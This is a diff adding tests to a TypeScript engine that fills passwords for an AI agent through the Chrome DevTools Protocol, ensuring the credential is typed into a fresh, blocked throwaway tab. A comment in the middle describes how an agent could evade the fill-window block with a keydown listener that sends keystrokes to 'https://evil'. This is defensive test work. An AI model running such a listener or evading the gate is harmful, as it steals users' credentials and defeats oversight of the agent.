@@ -98,6 +98,9 @@ describe("ordering is the design", () => {
     const transport = new FakeCdpTransport();
     const spy = vi.spyOn(transport, "send").mockImplementation(async (m: CdpMessage) => {
       if (m.method === "Input.insertText") states.push(gate.isFilling(TARGET));
+      if (m.method === "Target.createTarget") {
+        return { ...(m.id !== undefined ? { id: m.id } : {}), result: { targetId: "fill-target" } };
+      }
       // Answer the attach handshake; the engine addresses the page by session.
       if (m.method === "Target.attachToTarget") {
         return { ...(m.id !== undefined ? { id: m.id } : {}), result: { sessionId: "s1" } };
@@ -171,6 +174,9 @@ describe("failure paths", () => {
     vi.spyOn(transport, "send").mockImplementation(async (m: CdpMessage) => {
       calls += 1;
       if (m.method === "Input.insertText") throw new Error("typing failed");
+      if (m.method === "Target.createTarget") {
+        return { ...(m.id !== undefined ? { id: m.id } : {}), result: { targetId: "fill-target" } };
+      }
       if (m.method === "Target.attachToTarget") {
         return { ...(m.id !== undefined ? { id: m.id } : {}), result: { sessionId: "s1" } };
       }
@@ -206,5 +212,101 @@ describe("failure paths", () => {
     });
     const out = await engine.fill(TARGET, GRANT, "#password");
     expect(JSON.stringify(out)).not.toContain(PASSWORD);
+  });
+});
+
+/**
+ * BRIDGE-M1: a listener installed before the window defeats blocking during it.
+ *
+ * Runtime.evaluate is allowlisted outside a fill window, so an agent can run
+ *
+ *     addEventListener('keydown', e => fetch('https://evil/?k=' + e.key), true)
+ *
+ * on its page, then ask for a fill and read the credential as it is typed —
+ * without issuing one CDP command while the window is open. Blocking commands
+ * during the window cannot reach that, because the attack does not use any.
+ *
+ * So the credential is typed into a target the agent has never scripted.
+ */
+describe("the credential is typed somewhere the agent has never run code", () => {
+  it("types into a freshly created target, not the agent's", async () => {
+    const { engine, transport } = deps();
+    await engine.fill(TARGET, GRANT, "#password");
+
+    const created = transport.sent.find((m) => m.method === "Target.createTarget");
+    expect(created, "no throwaway target was created").toBeDefined();
+
+    // Nothing may be typed into the agent's own target.
+    const typed = transport.sent.filter((m) => m.method === "Input.insertText");
+    expect(typed).toHaveLength(1);
+    expect(typed[0]?.params?.targetId).toBeUndefined();
+    expect(typed[0]?.sessionId).toBeDefined();
+
+    const attach = transport.sent.find((m) => m.method === "Target.attachToTarget");
+    expect(
+      attach?.params?.targetId,
+      "attached to the agent's target instead of the fresh one",
+    ).not.toBe(TARGET);
+  });
+
+  it("navigates the fresh target to the binding url, never the agent's page", async () => {
+    const { engine, transport } = deps();
+    await engine.fill(TARGET, GRANT, "#password");
+    const navs = transport.sent.filter((m) => m.method === "Page.navigate");
+    expect(navs).toHaveLength(1);
+    expect(navs[0]?.params?.url).toBe(GRANT.loginUrl);
+    // Addressed by session — the fresh target's — not by the agent's targetId.
+    expect(navs[0]?.params?.targetId).toBeUndefined();
+  });
+
+  it("windows the fresh target too, since the agent can enumerate and attach", async () => {
+    // Target.getTargets and Target.attachToTarget are both allowlisted, so a
+    // fresh target that is not itself blocked is only hidden, not protected.
+    const gate = new CdpGate();
+    const transport = new FakeCdpTransport();
+    const windowed: string[] = [];
+    const realOpen = gate.openFillWindow.bind(gate);
+    vi.spyOn(gate, "openFillWindow").mockImplementation((t: string) => {
+      windowed.push(t);
+      realOpen(t);
+    });
+    const engine = new FillEngine({
+      backend: { consumeFill: async () => SecretHandle.fromUtf8(PASSWORD) } as unknown as VaultBackend,
+      transport,
+      gate,
+      currentGeneration: () => GRANT.generation,
+    });
+    await engine.fill(TARGET, GRANT, "#password");
+
+    expect(windowed).toContain(TARGET);
+    expect(windowed.length, "the throwaway target was left unblocked").toBeGreaterThan(1);
+  });
+
+  it("closes and unblocks the throwaway target afterwards", async () => {
+    const { engine, transport, gate } = deps();
+    await engine.fill(TARGET, GRANT, "#password");
+    const created = transport.sent.find((m) => m.method === "Target.createTarget");
+    expect(created).toBeDefined();
+    const closed = transport.sent.find((m) => m.method === "Target.closeTarget");
+    expect(closed, "the throwaway target was left open").toBeDefined();
+    const freshId = closed?.params?.targetId as string;
+    expect(gate.isFilling(freshId), "the throwaway target stayed blocked").toBe(false);
+    expect(gate.isFilling(TARGET)).toBe(false);
+  });
+
+  it("creates the target in the agent's browser context so the cookie lands there", async () => {
+    const transport = new FakeCdpTransport();
+    const engine = new FillEngine({
+      backend: { consumeFill: async () => SecretHandle.fromUtf8(PASSWORD) } as unknown as VaultBackend,
+      transport,
+      gate: new CdpGate(),
+      currentGeneration: () => GRANT.generation,
+      browserContextOf: () => "ctx-agent",
+    });
+    await engine.fill(TARGET, GRANT, "#password");
+    const created = transport.sent.find((m) => m.method === "Target.createTarget");
+    // Wrong context means the credential authenticates a session the agent
+    // never sees, which fails silently and looks like a broken login.
+    expect(created?.params?.browserContextId).toBe("ctx-agent");
   });
 });
